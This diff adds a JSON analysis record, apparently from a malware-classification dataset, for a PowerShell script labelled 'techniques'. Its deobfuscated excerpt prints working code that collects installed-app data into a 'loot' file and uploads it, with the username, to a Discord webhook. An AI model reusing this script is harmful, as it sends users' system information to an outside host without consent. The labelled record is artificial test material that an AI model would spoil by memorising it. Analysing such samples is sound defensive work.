@@ -1,0 +1,102 @@
+{
+  "meta": {
+    "quelldatei": "tech_005_Get-AppInfo.ps1",
+    "sha256": "655652cbfa8b2a16b0cf6f9eac0eca51277382c44af200e4e6d36c66bcfe0948",
+    "groesse_bytes": 802,
+    "zeilen": 31,
+    "ground_truth_label": "techniques",
+    "analyse_gekuerzt": false,
+    "hinweis": "Kein Urteil enthalten. Bewertung erfolgt durch das LLM."
+  },
+  "stufe1_extract": {
+    "strings": [
+      "CaliAppLoot.txt",
+      "App information saved to: $outputFile",
+      "Application/Json",
+      "username",
+      "content",
+      "YOUR WEBHOOK HERE",
+      "$env:TEMP\\CaliAppLoot.txt"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0
+  },
+  "stufe2_features": {
+    "strings": [
+      "CaliAppLoot.txt",
+      "App information saved to: $outputFile",
+      "Application/Json",
+      "username",
+      "content",
+      "YOUR WEBHOOK HERE",
+      "$env:TEMP\\CaliAppLoot.txt"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-AppInfo",
+      "Get-AppxPackage",
+      "Get-AppxSetting",
+      "Invoke-RestMethod",
+      "Join-Path",
+      "New-Object",
+      "Out-Null",
+      "Upload-Discord",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\CaliAppLoot.txt",
+        "$env:username"
+      ]
+    }
+  },
+  "stufe3_structure": {
+    "strings": [
+      "CaliAppLoot.txt",
+      "App information saved to: $outputFile",
+      "Application/Json",
+      "username",
+      "content",
+      "YOUR WEBHOOK HERE",
+      "$env:TEMP\\CaliAppLoot.txt"
+    ],
+    "string_anzahl_gesamt": 7,
+    "base64_bloecke_dekodiert": [],
+    "base64_bloecke_gesamt": 0,
+    "beobachtete_cmdlets": [
+      "Get-AppInfo",
+      "Get-AppxPackage",
+      "Get-AppxSetting",
+      "Invoke-RestMethod",
+      "Join-Path",
+      "New-Object",
+      "Out-Null",
+      "Upload-Discord",
+      "Write-Host"
+    ],
+    "auffaellige_tokens": {
+      "webclient": 1
+    },
+    "iocs": {
+      "urls": [],
+      "ipv4": [],
+      "pfade": [
+        "$env:TEMP\\CaliAppLoot.txt",
+        "$env:username"
+      ]
+    },
+    "deobfuskiert_auszug": "function Get-AppInfo {\n    $tempDir = [System.IO.Path]::GetTempPath()\n    $outputFile = Join-Path $tempDir \"CaliAppLoot.txt\"\n\n    # Run the Get-AppxSetting command and redirect its output to the file\n    Get-AppxPackage > $outputFile\n\n    Write-Host \"App information saved to: $outputFile\"\n}\n\n\nfunction Upload-Discord {\n    param (\n        [string]$file,\n        [string]$text,\n        [string]$webhookUrl\n    )\n\n    if ($text) {\n        Invoke-RestMethod -ContentType 'Application/Json' -Uri $webhookUrl -Method Post -Body @{ 'username' = $env:username; 'content' = $text }\n    }\n    elseif ($file) {\n        (New-Object Net.WebClient).UploadFile($webhookUrl, $file)\n    }\n}\n\n\n#Example usage:\n\n# Get-AppInfo; Upload-Discord -webhookUrl 'YOUR WEBHOOK HERE' -file \"$env:TEMP\\CaliAppLoot.txt\" | Out-Null\n",
+    "dekodierte_befehle": [],
+    "beobachtete_abfolge": [
+      "WebClient erstellen"
+    ]
+  }
+}
